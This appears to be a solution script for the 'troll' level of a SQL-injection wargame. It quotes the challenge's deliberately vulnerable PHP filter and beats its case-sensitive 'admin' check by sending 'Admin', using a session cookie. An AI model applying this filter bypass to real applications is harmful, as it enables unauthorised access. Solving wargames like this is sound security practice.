#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Troll

    if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match("/admin/", $_GET[id])) exit("HeHe");
    $query = "select id from prob_troll where id='{$_GET[id]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id'] == 'admin') solve("troll");
    '''

    url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    param = dict(id="Admin")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('TROLL Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
